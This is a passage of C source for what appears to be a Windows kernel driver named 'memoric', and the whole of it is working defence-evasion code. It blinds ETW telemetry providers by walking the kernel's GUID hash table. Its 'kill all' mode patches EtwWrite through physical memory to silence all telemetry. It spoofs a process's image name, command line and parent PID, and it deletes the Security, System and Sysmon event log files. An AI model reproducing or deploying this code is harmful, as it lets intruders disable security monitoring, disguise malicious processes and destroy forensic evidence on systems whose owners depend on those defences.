    case MEMORIC_FILE_LOCK_CLEAR: {
        LONG i;
        for (i = 0; i < MAX_FILE_LOCK_ENTRIES; i++) {
            g_FileLockEntries[i].InUse = FALSE;
        }
        resp->LockedCount = (ULONG)g_FileLockCount;
        InterlockedExchange(&g_FileLockCount, 0);
        resp->TotalLocked = 0;
        resp->Success = 1;

        /* Remove NTFS hooks when no files are locked */
        FileLockRemoveHooks();
        break;
    }
    }

    *bytesReturned = sizeof(MEMORIC_FILE_LOCK_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * ETW Blind — Disable ETW providers by walking EtwpGuidHashTable
 *
 * Proper ETW provider blinding:
 * 1. Find ntoskrnl!EtwRegister export
 * 2. Trace EtwRegister + callees for LEA [rip+disp32] referencing hash table
 * 3. Validate candidate as 64-bucket LIST_ENTRY hash table
 * 4. Hash the target GUID, walk the matching bucket
 * 5. ETW_GUID_ENTRY: GUID at +0x20, EnableInfo at GUID+0x10
 * 6. Fallback: scan ntoskrnl .data section only
 *
 * Reference: TelemetrySourcerer, InfinityHook ETW internals
 * ---------------------------------------------------------------- */

/* Saved ETW provider states for restore on ENABLE */
#define MAX_ETW_BLIND_SAVED 16
static struct {
    UCHAR   Guid[16];
    ULONG64 OldEnableInfo;
    ULONG64 OldEnableInfo2;
    ULONG64 EntryAddr;
    ULONG   GuidOffset; /* offset of GUID within entry (0x18 or 0x20) */
} g_EtwBlindSaved[MAX_ETW_BLIND_SAVED] = {0};
static ULONG g_EtwBlindSavedCount = 0;

/* Cached hash table address to avoid re-scanning on subsequent calls */
static PVOID g_EtwHashTable = NULL;
static PVOID g_NtoskrnlBase = NULL;
static ULONG g_NtoskrnlSize = 0;

/*
 * Dynamically discovered GUID offset within ETW_GUID_ENTRY.
 * Calibrated by registering a probe provider via EtwRegister,
 * locating our GUID in the hash table, then EtwUnregister.
 */
static ULONG g_EtwGuidEntryGuidOffset = 0;

static BOOLEAN CalibrateEtwGuidOffset(PVOID hashTable)
{
    /* Test GUID — random unique value for calibration only */
    static const GUID probeGuid = {
        0xDEADCAFE, 0x1234, 0x5678,
        { 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89 }
    };
    REGHANDLE regHandle = 0;
    NTSTATUS st;

    if (g_EtwGuidEntryGuidOffset != 0) return TRUE;

    /* Resolve EtwRegister dynamically */
    {
        typedef NTSTATUS (NTAPI *PFN_EtwRegister)(const GUID*, PVOID, PVOID, PREGHANDLE);
        typedef NTSTATUS (NTAPI *PFN_EtwUnregister)(REGHANDLE);
        UNICODE_STRING fnName;
        PFN_EtwRegister pfnReg;
        PFN_EtwUnregister pfnUnreg;

        RtlInitUnicodeString(&fnName, L"EtwRegister");
        pfnReg = (PFN_EtwRegister)MmGetSystemRoutineAddress(&fnName);
        RtlInitUnicodeString(&fnName, L"EtwUnregister");
        pfnUnreg = (PFN_EtwUnregister)MmGetSystemRoutineAddress(&fnName);

        if (!pfnReg || !pfnUnreg) return FALSE;

        st = pfnReg(&probeGuid, NULL, NULL, &regHandle);
        if (!NT_SUCCESS(st)) return FALSE;

        /* Hash the probe GUID to find its bucket */
        {
            PULONG gd = (PULONG)&probeGuid;
            ULONG hash = (gd[0] ^ (gd[0] >> 16)) % 64;
            PLIST_ENTRY bucket = &((PLIST_ENTRY)hashTable)[hash];

            __try {
                PLIST_ENTRY entry = bucket->Flink;
                ULONG safety = 0;
                while (entry != bucket && safety < 64) {
                    /* Scan the entry for our probe GUID at candidate offsets */
                    ULONG probe;
                    for (probe = 0x10; probe <= 0x40; probe += 0x08) {
                        if (RtlCompareMemory((PUCHAR)entry + probe, &probeGuid, 16) == 16) {
                            g_EtwGuidEntryGuidOffset = probe;
                            DbgPrint("[memoric] EtwBlind: Calibrated ETW_GUID_ENTRY GUID offset = 0x%X\n", probe);
                            goto calibrated;
                        }
                    }
                    entry = entry->Flink;
                    safety++;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { }

        calibrated:
            pfnUnreg(regHandle);
        }
    }

    return g_EtwGuidEntryGuidOffset != 0;
}

/* Find an export by name in a PE image */
static PVOID EtwFindExportByName(PVOID imageBase, PCHAR exportName)
{
    PIMAGE_NT_HEADERS ntHdr = RtlImageNtHeader(imageBase);
    if (!ntHdr) return NULL;

    ULONG exportDirRva = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    ULONG exportDirSize = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (exportDirRva == 0 || exportDirSize == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)imageBase + exportDirRva);
    PULONG nameRvas = (PULONG)((PUCHAR)imageBase + exports->AddressOfNames);
    PUSHORT ordinals = (PUSHORT)((PUCHAR)imageBase + exports->AddressOfNameOrdinals);
    PULONG funcRvas = (PULONG)((PUCHAR)imageBase + exports->AddressOfFunctions);

    ULONG i;
    for (i = 0; i < exports->NumberOfNames; i++) {
        PCHAR name = (PCHAR)imageBase + nameRvas[i];
        if (strcmp(name, exportName) == 0) {
            ULONG funcRva = funcRvas[ordinals[i]];
            /* Check for forwarded export */
            if (funcRva >= exportDirRva && funcRva < exportDirRva + exportDirSize)
                return NULL;
            return (PUCHAR)imageBase + funcRva;
        }
    }
    return NULL;
}

/*
 * Validate a candidate pointer as a 64-bucket LIST_ENTRY hash table.
 * Each bucket is a LIST_ENTRY where Flink/Blink are valid kernel pointers.
 * Most buckets should be empty (self-referencing).
 */
static BOOLEAN EtwValidateHashTable(PVOID candidate)
{
    __try {
        PLIST_ENTRY buckets = (PLIST_ENTRY)candidate;
        ULONG emptyCount = 0;
        ULONG i;
        for (i = 0; i < 64; i++) {
            ULONG_PTR flink = (ULONG_PTR)buckets[i].Flink;
            ULONG_PTR blink = (ULONG_PTR)buckets[i].Blink;
            /* Must be valid kernel pointers */
            if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL)
                return FALSE;
            /* Empty bucket: points to itself */
            if (buckets[i].Flink == &buckets[i])
                emptyCount++;
        }
        /* A valid hash table should have mostly empty buckets (>10 of 64) */
        return (emptyCount > 10);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

/*
 * Find EtwpGuidHashTable by scanning EtwRegister and its callees
 * for LEA [rip+disp32] instructions that point to a valid 64-bucket hash table.
 */
static PVOID EtwFindGuidHashTable(PVOID ntBase, ULONG ntSize)
{
    PVOID etwReg;
    PUCHAR code;
    ULONG off;

    /* Use cached result if available */
    if (g_EtwHashTable && g_NtoskrnlBase == ntBase)
        return g_EtwHashTable;

    etwReg = EtwFindExportByName(ntBase, "EtwRegister");
    if (!etwReg) {
        DbgPrint("[memoric] EtwBlind: EtwRegister export not found\n");
        return NULL;
    }

    code = (PUCHAR)etwReg;

    __try {
        /* Pass 1: scan EtwRegister itself (first 512 bytes) for LEA [rip+disp32] */
        for (off = 0; off < 500; off++) {
            /* LEA r64, [rip+disp32]: REX.W(48/4C) 8D ModRM(xx 05) disp32 */
            if ((code[off] == 0x48 || code[off] == 0x4C) &&
                code[off+1] == 0x8D &&
                (code[off+2] & 0xC7) == 0x05) {

                LONG disp = *(PLONG)(&code[off+3]);
                PVOID target = &code[off+7] + disp;

                if ((ULONG_PTR)target >= (ULONG_PTR)ntBase &&
                    (ULONG_PTR)target < (ULONG_PTR)ntBase + ntSize) {
                    if (EtwValidateHashTable(target)) {
                        DbgPrint("[memoric] EtwBlind: Hash table at %p (EtwRegister+0x%X)\n", target, off);
                        g_EtwHashTable = target;
                        g_NtoskrnlBase = ntBase;
                        g_NtoskrnlSize = ntSize;
                        return target;
                    }
                }
            }
        }

        /* Pass 2: follow CALL rel32 instructions in EtwRegister and scan callees */
        for (off = 0; off < 500; off++) {
            if (code[off] == 0xE8) { /* CALL rel32 */
                LONG disp = *(PLONG)(&code[off+1]);
                PVOID callee = &code[off+5] + disp;

                if ((ULONG_PTR)callee >= (ULONG_PTR)ntBase &&
                    (ULONG_PTR)callee < (ULONG_PTR)ntBase + ntSize - 512) {

                    PUCHAR ccode = (PUCHAR)callee;
                    ULONG coff;
                    for (coff = 0; coff < 384; coff++) {
                        if ((ccode[coff] == 0x48 || ccode[coff] == 0x4C) &&
                            ccode[coff+1] == 0x8D &&
                            (ccode[coff+2] & 0xC7) == 0x05) {

                            LONG cdisp = *(PLONG)(&ccode[coff+3]);
                            PVOID ctarget = &ccode[coff+7] + cdisp;

                            if ((ULONG_PTR)ctarget >= (ULONG_PTR)ntBase &&
                                (ULONG_PTR)ctarget < (ULONG_PTR)ntBase + ntSize) {
                                if (EtwValidateHashTable(ctarget)) {
                                    DbgPrint("[memoric] EtwBlind: Hash table at %p (callee %p+0x%X)\n",
                                             ctarget, callee, coff);
                                    g_EtwHashTable = ctarget;
                                    g_NtoskrnlBase = ntBase;
                                    g_NtoskrnlSize = ntSize;
                                    return ctarget;
                                }
                            }
                        }
                    }

                    /* Pass 3: follow one more level of CALL from each callee */
                    for (coff = 0; coff < 384; coff++) {
                        if (ccode[coff] == 0xE8) {
                            LONG c2disp = *(PLONG)(&ccode[coff+1]);
                            PVOID callee2 = &ccode[coff+5] + c2disp;

                            if ((ULONG_PTR)callee2 >= (ULONG_PTR)ntBase &&
                                (ULONG_PTR)callee2 < (ULONG_PTR)ntBase + ntSize - 512) {

                                PUCHAR c2code = (PUCHAR)callee2;
                                ULONG c2off;
                                for (c2off = 0; c2off < 384; c2off++) {
                                    if ((c2code[c2off] == 0x48 || c2code[c2off] == 0x4C) &&
                                        c2code[c2off+1] == 0x8D &&
                                        (c2code[c2off+2] & 0xC7) == 0x05) {

                                        LONG c2rdisp = *(PLONG)(&c2code[c2off+3]);
                                        PVOID c2target = &c2code[c2off+7] + c2rdisp;

                                        if ((ULONG_PTR)c2target >= (ULONG_PTR)ntBase &&
                                            (ULONG_PTR)c2target < (ULONG_PTR)ntBase + ntSize) {
                                            if (EtwValidateHashTable(c2target)) {
                                                DbgPrint("[memoric] EtwBlind: Hash table at %p (callee2 %p+0x%X)\n",
                                                         c2target, callee2, c2off);
                                                g_EtwHashTable = c2target;
                                                g_NtoskrnlBase = ntBase;
                                                g_NtoskrnlSize = ntSize;
                                                return c2target;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[memoric] EtwBlind: Exception during hash table search\n");
    }

    DbgPrint("[memoric] EtwBlind: Hash table not found via code analysis\n");
    return NULL;
}

/*
 * Find ntoskrnl base address and size via ZwQuerySystemInformation.
 */
static BOOLEAN EtwGetNtoskrnlBase(PVOID *ppBase, PULONG pSize)
{
    PRTL_PROCESS_MODULES modules = NULL;
    ULONG bufSize = 0;
    NTSTATUS st;
    ULONG i;

    st = ZwQuerySystemInformation(11, NULL, 0, &bufSize);
    if (bufSize == 0) return FALSE;
    bufSize += 4096;
    modules = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize, MEMORIC_POOL_TAG);
    if (!modules) return FALSE;

    st = ZwQuerySystemInformation(11, modules, bufSize, &bufSize);
    if (NT_SUCCESS(st)) {
        for (i = 0; i < modules->NumberOfModules; i++) {
            PCHAR name = (PCHAR)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
            if (_stricmp(name, "ntoskrnl.exe") == 0) {
                *ppBase = modules->Modules[i].ImageBase;
                *pSize = modules->Modules[i].ImageSize;
                ExFreePoolWithTag(modules, MEMORIC_POOL_TAG);
                return TRUE;
            }
        }
    }
    ExFreePoolWithTag(modules, MEMORIC_POOL_TAG);
    return FALSE;
}

static NTSTATUS HandleEtwBlind(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_ETW_BLIND_REQUEST reqCopy;
    PMEMORIC_ETW_BLIND_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_ETW_BLIND_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_ETW_BLIND_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_ETW_BLIND_REQUEST));
    resp = (PMEMORIC_ETW_BLIND_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_ETW_BLIND_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_ETW_BLIND_DISABLE:
    case MEMORIC_ETW_BLIND_ENABLE: {
        /*
         * Proper ETW provider blinding via EtwpGuidHashTable walk.
         * 1. Find ntoskrnl base + EtwRegister export via code analysis
         * 2. Walk hash table: 64 buckets, each LIST_ENTRY chain
         * 3. ETW_GUID_ENTRY: GUID at +0x20 (Win10 1903+), EnableInfo at GUID+0x10
         * 4. Fallback: scan ntoskrnl .data section only (not entire image)
         */
        PVOID ntBase = NULL;
        ULONG ntSize = 0;

        if (!EtwGetNtoskrnlBase(&ntBase, &ntSize)) {
            DbgPrint("[memoric] EtwBlind: ntoskrnl not found\n");
            break;
        }

        /* Try hash table approach first */
        PVOID hashTable = EtwFindGuidHashTable(ntBase, ntSize);

        if (hashTable) {
            /* Calibrate GUID offset via self-registration if not yet known */
            if (g_EtwGuidEntryGuidOffset == 0)
                CalibrateEtwGuidOffset(hashTable);

            if (g_EtwGuidEntryGuidOffset == 0) {
                DbgPrint("[memoric] EtwBlind: Failed to calibrate GUID offset\n");
                break;
            }

            /* Hash the GUID to find the right bucket (same algorithm as nt!EtwpHashGuid) */
            PULONG guidData = (PULONG)reqCopy.ProviderGuid;
            ULONG hash = (guidData[0] ^ (guidData[0] >> 16)) % 64;
            PLIST_ENTRY bucket = &((PLIST_ENTRY)hashTable)[hash];
            ULONG guidOff = g_EtwGuidEntryGuidOffset;

            __try {
                PLIST_ENTRY entry = bucket->Flink;
                while (entry != bucket) {
                    PVOID entryGuid = (PUCHAR)entry + guidOff;

                    if (RtlCompareMemory(entryGuid, reqCopy.ProviderGuid, 16) == 16) {
                        /* Found! EnableInfo is at GUID + 0x10 */
                        PULONG enablePtr = (PULONG)((PUCHAR)entry + guidOff + 0x10);
                        PULONG enablePtr2 = enablePtr + 1;

                        if (reqCopy.Action == MEMORIC_ETW_BLIND_DISABLE) {
                            ULONG si;
                            for (si = 0; si < MAX_ETW_BLIND_SAVED; si++) {
                                if (g_EtwBlindSaved[si].EntryAddr == 0) {
                                    RtlCopyMemory(g_EtwBlindSaved[si].Guid, reqCopy.ProviderGuid, 16);
                                    g_EtwBlindSaved[si].OldEnableInfo = (ULONG64)*enablePtr;
                                    g_EtwBlindSaved[si].OldEnableInfo2 = (ULONG64)*enablePtr2;
                                    g_EtwBlindSaved[si].EntryAddr = (ULONG64)(ULONG_PTR)entry;
                                    g_EtwBlindSaved[si].GuidOffset = guidOff;
                                    if (g_EtwBlindSavedCount < MAX_ETW_BLIND_SAVED)
                                        g_EtwBlindSavedCount++;
                                    break;
                                }
                            }

                            resp->OldEnableInfo = (ULONG64)*enablePtr;
                            *enablePtr = 0;
                            *enablePtr2 = 0;
                            resp->ProviderAddr = (ULONG64)(ULONG_PTR)entry;
                            resp->ProvidersAffected = 1;
                            resp->Success = 1;
                            DbgPrint("[memoric] EtwBlind: Disabled provider at %p (calibrated guid+0x%X)\n",
                                     entry, guidOff);
                        } else {
                            /* ENABLE: restore from saved state */
                            ULONG si;
                            BOOLEAN restored = FALSE;
                            for (si = 0; si < MAX_ETW_BLIND_SAVED; si++) {
                                if (g_EtwBlindSaved[si].EntryAddr == (ULONG64)(ULONG_PTR)entry) {
                                    *enablePtr = (ULONG)g_EtwBlindSaved[si].OldEnableInfo;
                                    *enablePtr2 = (ULONG)g_EtwBlindSaved[si].OldEnableInfo2;
                                    g_EtwBlindSaved[si].EntryAddr = 0;
                                    restored = TRUE;
                                    break;
                                }
                            }
                            if (!restored) {
                                *enablePtr = 0xFF;
                            }
                            resp->ProviderAddr = (ULONG64)(ULONG_PTR)entry;
                            resp->ProvidersAffected = 1;
                            resp->Success = 1;
                            DbgPrint("[memoric] EtwBlind: Re-enabled provider at %p\n", entry);
                        }
                        goto etw_done;
                    }
                    entry = entry->Flink;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] EtwBlind: Exception walking hash table bucket %lu\n", hash);
            }
        }

    etw_done:
        if (!resp->Success)
            DbgPrint("[memoric] EtwBlind: Provider GUID not found\n");
        break;
    }

    case MEMORIC_ETW_BLIND_QUERY: {
        /* Return count of blinded providers */
        resp->ProvidersAffected = g_EtwBlindSavedCount;
        resp->Success = 1;
        break;
    }

    case MEMORIC_ETW_BLIND_KILL_ALL: {
        /*
         * Disable ALL ETW providers by patching EtwWrite prologue
         * to xor eax,eax; ret (same technique as g_CiOptions bypass).
         * This is nuclear — blinds ALL telemetry.
         */
        PVOID ntBase = NULL;
        ULONG ntSize = 0;

        if (!EtwGetNtoskrnlBase(&ntBase, &ntSize)) break;

        if (ntBase) {
            /* Find EtwWrite export and patch its prologue */
            PVOID etwWrite = EtwFindExportByName(ntBase, "EtwWrite");
            if (etwWrite) {
                /* Patch: xor eax,eax; ret = 31 C0 C3 */
                UCHAR patch[] = { 0x31, 0xC0, 0xC3 };

                /* Use physical memory write to bypass write protect */
                PHYSICAL_ADDRESS pa = MmGetPhysicalAddress(etwWrite);
                if (pa.QuadPart) {
                    PVOID mapped = MmMapIoSpace(pa, 16, MmNonCached);
                    if (mapped) {
                        RtlCopyMemory(mapped, patch, 3);
                        MmUnmapIoSpace(mapped, 16);
                        resp->Success = 1;
                        resp->ProvidersAffected = 0xFFFFFFFF; /* All */
                        resp->ProviderAddr = (ULONG64)(ULONG_PTR)etwWrite;
                        DbgPrint("[memoric] EtwBlind: Patched EtwWrite at %p\n", etwWrite);
                    }
                }
            }
        }
        break;
    }
    }

    *bytesReturned = sizeof(MEMORIC_ETW_BLIND_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * EPROCESS Spoof — Modify EPROCESS fields to disguise process
 * ---------------------------------------------------------------- */

static NTSTATUS HandleEprocessSpoof(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_EPROCESS_SPOOF_REQUEST reqCopy;
    PMEMORIC_EPROCESS_SPOOF_RESPONSE resp;
    PEPROCESS process = NULL;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_EPROCESS_SPOOF_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_EPROCESS_SPOOF_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_EPROCESS_SPOOF_REQUEST));
    resp = (PMEMORIC_EPROCESS_SPOOF_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_EPROCESS_SPOOF_RESPONSE));
    resp->ProcessId = reqCopy.ProcessId;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] EprocSpoof: PID %lu not found\n", reqCopy.ProcessId);
        *bytesReturned = sizeof(MEMORIC_EPROCESS_SPOOF_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->EprocessAddr = (ULONG64)(ULONG_PTR)process;

    switch (reqCopy.Action) {
    case MEMORIC_SPOOF_IMAGE_NAME: {
        if (g_Offsets.Resolved && g_Offsets.ImageFileName != 0) {
            PUCHAR imgName = (PUCHAR)process + g_Offsets.ImageFileName;
            /* Save old name */
            RtlCopyMemory(resp->OldImageName, imgName, 15);
            resp->OldImageName[15] = 0;
            /* Write new name */
            RtlZeroMemory(imgName, 15);
            RtlCopyMemory(imgName, reqCopy.NewImageName, 15);
            resp->Success = 1;
            DbgPrint("[memoric] EprocSpoof: PID %lu ImageFileName -> '%s'\n",
                     reqCopy.ProcessId, imgName);
        }
        break;
    }

    case MEMORIC_SPOOF_COMMAND_LINE: {
        /*
         * Modify PEB->ProcessParameters->CommandLine in the target process.
         * 
         * We use ZwQueryInformationProcess(ProcessBasicInformation) to get
         * PebBaseAddress, then read ProcessParameters and CommandLine via
         * documented RTL_USER_PROCESS_PARAMETERS layout (CommandLine at +0x70).
         * The +0x20 offset for ProcessParameters in PEB and +0x70 for CommandLine
         * in RTL_USER_PROCESS_PARAMETERS are documented in winternl.h.
         */
        KAPC_STATE apcState;
        KeStackAttachProcess((PKPROCESS)process, &apcState);

        __try {
            PROCESS_BASIC_INFORMATION pbi;
            ULONG retLen = 0;
            st = ZwQueryInformationProcess(
                ZwCurrentProcess(), ProcessBasicInformation,
                &pbi, sizeof(pbi), &retLen);

            if (NT_SUCCESS(st) && pbi.PebBaseAddress) {
                /* RTL_USER_PROCESS_PARAMETERS* at PEB+0x20 (documented winternl.h) */
                PVOID processParams = *(PVOID*)((PUCHAR)pbi.PebBaseAddress + 0x20);
                if (processParams) {
                    /* CommandLine UNICODE_STRING at RTL_USER_PROCESS_PARAMETERS+0x70 (documented) */
                    PUNICODE_STRING cmdLine = (PUNICODE_STRING)((PUCHAR)processParams + 0x70);
                    if (cmdLine->Buffer && cmdLine->MaximumLength > 0) {
                        USHORT newLen = 0;
                        ULONG i;
                        for (i = 0; i < 260 && reqCopy.NewCommandLine[i]; i++)
                            newLen++;
                        newLen *= sizeof(WCHAR);

                        if (newLen <= cmdLine->MaximumLength) {
                            RtlZeroMemory(cmdLine->Buffer, cmdLine->MaximumLength);
                            RtlCopyMemory(cmdLine->Buffer, reqCopy.NewCommandLine, newLen);
                            cmdLine->Length = newLen;
                            resp->Success = 1;
                        }
                    }
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] EprocSpoof: Exception modifying command line\n");
        }

        KeUnstackDetachProcess(&apcState);
        break;
    }

    case MEMORIC_SPOOF_PID: {
        /* Spoof InheritedFromUniqueProcessId */
        if (g_Offsets.Resolved && g_Offsets.InheritedFromUniqueProcessId != 0) {
            ULONG ppidOffset = g_Offsets.InheritedFromUniqueProcessId;
            PULONG_PTR ppidPtr = (PULONG_PTR)((PUCHAR)process + ppidOffset);

            __try {
                resp->OldParentPid = (ULONG)*ppidPtr;
                *ppidPtr = (ULONG_PTR)reqCopy.NewParentPid;
                resp->Success = 1;
                DbgPrint("[memoric] EprocSpoof: PID %lu PPID %lu -> %lu\n",
                         reqCopy.ProcessId, resp->OldParentPid, reqCopy.NewParentPid);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] EprocSpoof: Exception modifying PPID\n");
            }
        }
        break;
    }

    case MEMORIC_SPOOF_QUERY: {
        if (g_Offsets.Resolved && g_Offsets.ImageFileName != 0) {
            PUCHAR imgName = (PUCHAR)process + g_Offsets.ImageFileName;
            RtlCopyMemory(resp->OldImageName, imgName, 15);
            resp->OldImageName[15] = 0;

            ULONG ppidOffset = g_Offsets.InheritedFromUniqueProcessId;
            PULONG_PTR ppidPtr = (PULONG_PTR)((PUCHAR)process + ppidOffset);
            __try { resp->OldParentPid = (ULONG)*ppidPtr; } __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
        resp->Success = 1;
        break;
    }
    }

    ObDereferenceObject(process);
    *bytesReturned = sizeof(MEMORIC_EPROCESS_SPOOF_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * Event Log Clear — Kill EventLog service threads + delete .evtx
 * ---------------------------------------------------------------- */

/* Forward-declare SYSTEM_PROCESS_INFO_APC if not yet defined (used by EventLogClear and KernelApcInject) */
#ifndef _SYSTEM_PROCESS_INFORMATION_DEFINED
#define _SYSTEM_PROCESS_INFORMATION_DEFINED
typedef struct _SYSTEM_THREAD_INFORMATION_APC {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    LONG Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION_APC;

typedef struct _SYSTEM_PROCESS_INFO_APC {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    SYSTEM_THREAD_INFORMATION_APC Threads[1];
} SYSTEM_PROCESS_INFO_APC, *PSYSTEM_PROCESS_INFO_APC;
#endif

/* User-mode PEB/LDR structures for walking loaded modules from kernel */
typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr;
} MY_PEB, *PMY_PEB;

/* ZwTerminateThread — dynamically resolved since not always exported */
typedef NTSTATUS (NTAPI *PFN_ZwTerminateThread)(HANDLE ThreadHandle, NTSTATUS ExitStatus);

static NTSTATUS HandleEventLogClear(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_EVENT_LOG_REQUEST reqCopy;
    PMEMORIC_EVENT_LOG_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_EVENT_LOG_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_EVENT_LOG_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_EVENT_LOG_REQUEST));
    resp = (PMEMORIC_EVENT_LOG_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_EVENT_LOG_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_EVTLOG_CLEAR_ALL:
    case MEMORIC_EVTLOG_CLEAR_SECURITY:
    case MEMORIC_EVTLOG_CLEAR_SYSTEM:
    case MEMORIC_EVTLOG_CLEAR_SYSMON: {
        /*
         * Find svchost.exe hosting EventLog service and kill its threads.
         * Then delete the .evtx files.
         */
        UNICODE_STRING evtxPath;
        OBJECT_ATTRIBUTES objAttr;
        HANDLE fileHandle;
        IO_STATUS_BLOCK ioStatus;
        NTSTATUS st;
        ULONG filesDeleted = 0;

        /* Delete event log files based on action */
        WCHAR logDir[] = L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\";
        WCHAR *files[] = {
            L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
            L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
            L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx",
        };
        ULONG fileCount = 4;
        ULONG startIdx = 0, endIdx = fileCount;
        ULONG i;

        if (reqCopy.Action == MEMORIC_EVTLOG_CLEAR_SECURITY) { startIdx = 0; endIdx = 1; }
        else if (reqCopy.Action == MEMORIC_EVTLOG_CLEAR_SYSTEM) { startIdx = 1; endIdx = 2; }
        else if (reqCopy.Action == MEMORIC_EVTLOG_CLEAR_SYSMON) { startIdx = 3; endIdx = 4; }

        for (i = startIdx; i < endIdx; i++) {
            RtlInitUnicodeString(&evtxPath, files[i]);
            InitializeObjectAttributes(&objAttr, &evtxPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

            st = ZwOpenFile(&fileHandle, DELETE, &objAttr, &ioStatus,
                           FILE_SHARE_DELETE, FILE_DELETE_ON_CLOSE);
            if (NT_SUCCESS(st)) {
                FILE_DISPOSITION_INFORMATION dispInfo;
